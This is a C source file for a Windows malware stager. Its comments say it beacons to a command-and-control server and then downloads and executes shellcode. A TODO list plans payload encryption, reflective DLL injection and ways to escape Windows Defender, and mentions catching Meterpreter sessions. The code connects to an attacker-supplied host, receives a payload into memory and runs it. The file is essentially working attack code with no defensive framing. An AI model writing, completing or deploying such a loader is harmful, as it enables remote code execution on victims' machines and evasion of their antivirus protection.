// Client executable for downloading second stage
// Beacons to C2 server, then downloads and executes shellcode
// TODO:  
// - Add encoding/encryption
// - Add capability for larger/more complicated payloads (probably through reflective dll injection)
// - Find ways to escape defender.  
//   --Can catch a meterp session, but any acvitity (download file, screenshot, etc) gets this caught and quarantined

#include "stager.h"

int __cdecl main(int argc, char **argv)
{

	WSADATA wsaData;
	SOCKET ConnectSocket = (SOCKET)calloc(1, sizeof(SOCKET));
	struct addrinfo *ptr = NULL, *result = NULL, hints;


	char* recvbuf = (char*) calloc(DEFAULT_BUFLEN, sizeof(char));

	int iResult;
	int recvbuflen = DEFAULT_BUFLEN;

	// validate params
	if (argc != 3)
	{
		printf("Usage: %s server port\n", argv[0]);
		return 1;
	}

	// Initialize winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0)
	{
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	// Resolve server address and port
	iResult = getaddrinfo(argv[1], argv[2], &hints, &result);
	if (iResult != 0)
	{
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Connect to server
	iResult = connect_c2(ptr, result,  &ConnectSocket);
	if (iResult != 0)
	{
		printf("Failed to connect to server, exiting\n");
		return 1;
	}


	// Receive data until the server closes the connection
	LPVOID memory_buffer = calloc(DEFAULT_BUFLEN, sizeof(char));
	
	do
	{
		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0)
		{
			printf("Bytes received: %d\n", iResult);

			iResult = prep_stage(recvbuf, &memory_buffer);
			if (iResult != 0)
			{
				printf("Preparation of stage failed with error: %d\n", WSAGetLastError());
				return 1;
			}


			
		}
		else if (iResult == 0)
			printf("Connection closed\n");
		else
		{
			printf("recv failed with error: %d\n", WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			return 1;
		}


	} while (iResult > 0);

	// execute shellcode
	printf("Executing shellcode");

	((void(*)()) memory_buffer)();

	// cleanup

	free(memory_buffer);
	free(recvbuf);
	closesocket(ConnectSocket);
	WSACleanup();
	free((void*)ConnectSocket);
	return 0;
}
